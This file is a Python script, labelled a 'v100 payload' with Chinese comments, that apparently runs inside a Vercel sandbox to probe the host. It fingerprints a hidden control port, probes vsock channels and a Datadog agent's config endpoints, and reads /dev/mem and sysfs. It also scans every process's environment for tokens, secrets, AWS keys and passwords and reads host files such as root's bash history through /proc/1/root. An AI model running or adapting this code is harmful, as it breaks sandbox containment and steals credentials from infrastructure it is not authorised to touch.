# -*- coding: utf-8 -*-
"""v100 payload: 宿主 23456 控制面深挖 + vsock 1025 + fd inode 定位 + H4-H7 精简
K1 23456 协议识别(4目标x5探测)  K2 定位 23456 LISTEN/ESTABLISHED inode 所属进程
K3 vsock 1025 探测  K4 Datadog 精简  K5 fd 考古  K6 /dev/mem  K7 host 文件
输出 /vercel/sandbox/v100c.out"""
import os, socket, struct, time, subprocess, glob, signal

OUT = '/vercel/sandbox/v100c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def sh(cmd, t=6):
    try:
        r = subprocess.run(['/bin/sh', '-c', cmd], capture_output=True, timeout=t)
        return (r.stdout or b'') + (r.stderr or b'')
    except Exception as e:
        return ('EXC %s' % type(e).__name__).encode()


# ---------- K1 23456 协议识别 ----------
log('=== K1 23456 protocol ID ===')
targets = ['127.0.0.1', '::1', '100.64.66.205', '100.64.0.1']
probes = [
    ('http1', b'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n'),
    ('h2pre', b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'),
    ('grpc', b'\x00\x00\x00\x00\x00'),
    ('tls', b'\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03' + b'\x00' * 32 + b'\x00'),
    ('raw', b'PING'),
]
for host in targets:
    for label, data in probes:
        try:
            s = socket.socket(socket.AF_INET6 if ':' in host else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((host, 23456))
            s.sendall(data)
            d = b''
            try:
                while len(d) < 16384:
                    c = s.recv(4096)
                    if not c:
                        break
                    d += c
            except socket.timeout:
                pass
            log('23456 %s %s -> %dB %r' % (label, host, len(d), d[:150]))
            s.close()
        except Exception as e:
            log('23456 %s %s EXC %s' % (label, host, type(e).__name__))
        time.sleep(0.2)


# ---------- K2 inode -> 进程定位 ----------
log('=== K2 inode->proc 23456 ===')
target_inodes = {'625': '23456-LISTEN', '1279': 'C1', '724': 'C2', '1282': 'C3', '717': 'C4'}
# 重新读 tcp6 表拿当前 inode
t6 = open('/proc/net/tcp6', errors='replace').read()
for ln in t6.splitlines()[1:]:
    parts = ln.split()
    if len(parts) > 9:
        laddr, raddr, st = parts[1], parts[2], parts[3]
        if ':5BA0' in laddr or st == '0A':
            log('TCP6 %s %s st=%s inode=%s' % (laddr, raddr, st, parts[9]))
            target_inodes.setdefault(parts[9], 'TCP6:%s' % laddr)
found = {}
for p in glob.glob('/proc/[0-9]*'):
    pid = p.split('/')[-1]
    try:
        fds = os.listdir(p + '/fd')
    except Exception:
        continue
    for fd in fds:
        try:
            tgt = os.readlink(p + '/fd/' + fd)
        except Exception:
            continue
        if tgt.startswith('socket:['):
            ino = tgt[8:-1]
            if ino in target_inodes:
                try:
                    comm = open(p + '/comm', errors='replace').read().strip()
                    cmd = open(p + '/cmdline', 'rb').read().replace(b'\x00', b' ').decode(errors='replace')[:100]
                except Exception:
                    comm, cmd = '?', '?'
                found.setdefault(ino, []).append((pid, fd, comm, cmd))
for ino, hits in found.items():
    for pid, fd, comm, cmd in hits:
        log('INODE %s(%s) pid=%s fd=%s comm=%s cmd=%s' % (ino, target_inodes.get(ino, '?'), pid, fd, comm, cmd))


# ---------- K3 vsock 1025 探测 ----------
log('=== K3 vsock 1025 ===')


def vsock_probe(port, data, label, t=2.0):
    try:
        s = socket.socket(40, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((2, port))
        s.sendall(data)
        d = b''
        try:
            while len(d) < 16384:
                c = s.recv(4096)
                if not c:
                    break
                d += c
        except socket.timeout:
            pass
        log('VSOCK %d %s -> %dB %r' % (port, label, len(d), d[:150]))
        s.close()
    except Exception as e:
        log('VSOCK %d %s EXC %s' % (port, label, type(e).__name__))


for label, data in [('http1', b'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n'),
                    ('h2pre', b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'),
                    ('raw', b'PING')]:
    vsock_probe(1025, data, label)
for port in [1024, 1026]:
    vsock_probe(port, b'PING', 'raw')


# ---------- K4 Datadog 1026 精简 ----------
log('=== K4 Datadog 1026 ===')


def http1(port, req, label, t=2.0):
    try:
        s = socket.socket(40, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((2, port))
        s.sendall(req)
        d = b''
        try:
            while len(d) < 65536:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except socket.timeout:
            pass
        log('%s rcvd %dB: %s' % (label, len(d), d[:260].decode('latin1', 'replace').replace('\r', '\\r').replace('\n', '\\n')))
        s.close()
    except Exception as e:
        log('%s EXC %s' % (label, type(e).__name__))


http1(1026, b'GET /evp_proxy/v1/ HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'evp-full')
http1(1026, b'POST /evp_proxy/v1/api/v2/series HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}', 'evp-series')
http1(1026, b'GET /config/set HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'cfg-get')
http1(1026, b'POST /config/set HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}', 'cfg-post')
http1(1026, b'GET /info HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'agent-info')
http1(1026, b'GET /api/v1/metadata HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', 'metadata')


# ---------- K5 fd 考古(精选进程) ----------
log('=== K5 fd archaeology ===')
kws = ('celld', 'containerd', 'sandbox-init', 'datadog', 'agent', 'vercel', 'runc', 'node', 'cell')
checked = 0
for p in sorted(glob.glob('/proc/[0-9]*'), key=lambda x: int(x.split('/')[-1])):
    pid = p.split('/')[-1]
    try:
        comm = open(p + '/comm', errors='replace').read().strip()
    except Exception:
        continue
    if not any(k in comm for k in kws):
        checked += 1
        if checked > 400:
            break
        continue
    try:
        cmd = open(p + '/cmdline', 'rb').read().replace(b'\x00', b' ').decode(errors='replace')[:80]
    except Exception:
        cmd = '?'
    fds = []
    try:
        for fd in os.listdir(p + '/fd'):
            try:
                tgt = os.readlink(p + '/fd/' + fd)
            except Exception:
                continue
            if 'socket:' in tgt or '.sock' in tgt or '/run/' in tgt or 'pipe:' in tgt:
                fds.append(fd + '->' + tgt)
    except Exception:
        pass
    if fds:
        log('PID %s %s cmd=%s fd(%d): %s' % (pid, comm, cmd, len(fds), '; '.join(fds[:40])))
    # 环境
    try:
        env = open(p + '/environ', 'rb').read()
        if env and any(k in env.lower() for k in (b'token', b'secret', b'api_key', b'aws', b'pass')):
            sec = [e.decode('latin1') for e in env.split(b'\x00') if e and any(
                k in e.lower() for k in (b'token', b'secret', b'api_key', b'aws', b'pass'))]
            log('PID %s %s ENV: %s' % (pid, comm, '; '.join(s[:100] for s in sec[:10])))
    except Exception:
        pass


# ---------- K6 /dev/mem + iomem ----------
log('=== K6 iomem/mem ===')
log(sh('cat /proc/iomem 2>&1').decode(errors='replace')[:2500])
try:
    d = open('/dev/mem', 'rb')
    log('/dev/mem open OK')
    try:
        log('/dev/mem first64 %s' % d.read(64).hex())
    except Exception as e:
        log('/dev/mem read EXC %s' % type(e).__name__)
    d.close()
except Exception as e:
    log('/dev/mem open FAIL %s' % type(e).__name__)
os.makedirs('/tmp/sys', exist_ok=True)
log('sysfs: ' + sh('mount -t sysfs sysfs /tmp/sys 2>&1; ls /tmp/sys/bus/virtio/devices/ 2>&1; ls /tmp/sys/class/net/ 2>&1').decode(errors='replace')[:1800])


# ---------- K7 host 文件 ----------
log('=== K7 host files ===')
for fp in ['/etc/hosts', '/etc/hostname', '/etc/datadog-agent/datadog.yaml',
           '/opt/vercel/celld.conf', '/etc/vercel/celld.yaml', '/root/.bash_history',
           '/etc/ssh/ssh_host_rsa_key.pub', '/run/vercel/share/ca-cert.pem']:
    r = sh('cat /proc/1/root%s 2>&1' % fp, t=3)
    r2 = r.decode(errors='replace')
    if r2.strip() and 'No such file' not in r2 and 'Permission denied' not in r2:
        log('HOSTFILE %s (%dB): %s' % (fp, len(r), r2[:500]))
for d in ['/run/vercel', '/run/vercel/share', '/opt/vercel', '/root', '/etc/datadog-agent']:
    r = sh('ls -la /proc/1/root%s 2>&1' % d, t=3)
    log('HOSTLS %s: %s' % (d, r.decode(errors='replace')[:600]))

log('V100C_DONE')
f.close()
